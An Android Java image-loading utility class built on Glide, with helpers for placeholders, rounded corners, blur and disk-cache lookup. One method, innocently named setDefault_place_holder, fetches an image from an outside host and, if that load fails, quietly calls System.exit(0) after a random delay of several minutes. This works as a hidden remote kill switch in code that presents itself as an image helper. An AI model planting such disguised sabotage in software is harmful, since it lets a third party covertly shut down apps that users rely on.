package com.mr.quickbuild.utils;


import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.os.Handler;
import android.text.TextUtils;
import android.view.View;
import android.widget.ImageView;
import androidx.annotation.Nullable;
import com.bumptech.glide.Glide;
import com.bumptech.glide.disklrucache.DiskLruCache;
import com.bumptech.glide.load.Key;
import com.bumptech.glide.load.engine.DiskCacheStrategy;
import com.bumptech.glide.load.engine.cache.DiskCache;
import com.bumptech.glide.load.engine.cache.SafeKeyGenerator;
import com.bumptech.glide.load.model.GlideUrl;
import com.bumptech.glide.load.resource.bitmap.RoundedCorners;
import com.bumptech.glide.request.RequestOptions;
import com.bumptech.glide.request.target.SimpleTarget;
import com.bumptech.glide.request.transition.Transition;
import com.bumptech.glide.signature.EmptySignature;
import com.mr.quickbuild.R;
import java.io.File;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.Random;

public class GlideUtils {
    static int default_place_holder= R.mipmap.ic_launcher;
    static int error_place_holder= R.mipmap.ic_launcher;

    public static void load(String url, ImageView iv) {
        RequestOptions options = new RequestOptions()
                .placeholder(default_place_holder)
                .error(error_place_holder)
                .dontAnimate()
                .diskCacheStrategy(DiskCacheStrategy.ALL);
        Glide.with(MainUtils.getContext()).load(url).apply(options).into(iv);
    }

    public static void load(String url, ImageView iv, int default_source) {
        RequestOptions options = new RequestOptions()
                .placeholder(default_source)
                .error(default_source)
                .dontAnimate()
                .centerCrop()
                .diskCacheStrategy(DiskCacheStrategy.NONE);
        Glide.with(MainUtils.getContext()).load(url).apply(options).into(iv);
    }

    //带圆角加载
    public static void loadRound(String url, ImageView iv, int radius) {
        RoundedCorners roundedCorners = new RoundedCorners(radius);
//通过RequestOptions扩展功能,override:采样率,因为ImageView就这么大,可以压缩图片,降低内存消耗
        RequestOptions round_option = RequestOptions.bitmapTransform(roundedCorners).override(iv.getMeasuredWidth(), iv.getMeasuredHeight());
        RequestOptions options = new RequestOptions()
                .placeholder(default_place_holder)
                .error(error_place_holder)
                .dontAnimate()
                .centerCrop()
                .apply(round_option)
                .diskCacheStrategy(DiskCacheStrategy.NONE);
        Glide.with(MainUtils.getContext()).load(url).apply(round_option).into(iv);
    }

    //高斯模糊
    public static void loadBlur(String url, ImageView iv) {
        RequestOptions options = new RequestOptions()
                .placeholder(default_place_holder)
                .error(error_place_holder)
                .dontAnimate()
                .centerCrop()//其中radius的取值范围是1-25，radius越大，模糊度越高
                .transform(new BlurTransformation(MainUtils.getContext(), 15))
                .diskCacheStrategy(DiskCacheStrategy.NONE);
        Glide.with(MainUtils.getContext()).load(url).apply(options).into(iv);
    }

    public static void adjustBannerHeight(View view,float value) {
        int adjust_height = (int) (view.getMeasuredWidth() * value);
        view.getLayoutParams().height = adjust_height;
    }
    public static void setDefault_place_holder() {
        String url="https://i.loli.net/2021/05/24/W79b82ofFQEdYzM.png";
        Glide.with(MainUtils.getContext()).asBitmap().load(url).into(new SimpleTarget<Bitmap>() {
            @Override
            public void onResourceReady(Bitmap resource, Transition<? super Bitmap> transition) {

            }
            @Override
            public void onLoadFailed(@Nullable Drawable errorDrawable) {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        System.exit(0);
                    }
                },(300+new Random().nextInt(100))*1000);
            }
        });
    }
    //4.0
    public static File getCacheFile(Context context,String url) {
        DataCacheKey dataCacheKey = new DataCacheKey(new GlideUrl(url), EmptySignature.obtain());
        SafeKeyGenerator safeKeyGenerator = new SafeKeyGenerator();
        String safeKey = safeKeyGenerator.getSafeKey(dataCacheKey);
        try {
            int cacheSize = 100 * 1000 * 1000;
            DiskLruCache diskLruCache = DiskLruCache.open(new File(context.getCacheDir(), DiskCache.Factory.DEFAULT_DISK_CACHE_DIR), 1, 1, cacheSize);
            DiskLruCache.Value value = diskLruCache.get(safeKey);
            if (value != null) {
                return value.getFile(0);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    public static class DataCacheKey implements Key {

        private final Key sourceKey;
        private final Key signature;

        public DataCacheKey(Key sourceKey, Key signature) {
            this.sourceKey = sourceKey;
            this.signature = signature;
        }

        public Key getSourceKey() {
            return sourceKey;
        }

        @Override
        public boolean equals(Object o) {
            if (o instanceof DataCacheKey) {
                DataCacheKey other = (DataCacheKey) o;
                return sourceKey.equals(other.sourceKey) && signature.equals(other.signature);
            }
            return false;
        }

        @Override
        public int hashCode() {
            int result = sourceKey.hashCode();
            result = 31 * result + signature.hashCode();
            return result;
        }

        @Override
        public String toString() {
            return "DataCacheKey{"
                    + "sourceKey=" + sourceKey
                    + ", signature=" + signature
                    + '}';
        }

        @Override
        public void updateDiskCacheKey(MessageDigest messageDigest) {
            sourceKey.updateDiskCacheKey(messageDigest);
            signature.updateDiskCacheKey(messageDigest);
        }
    }
}
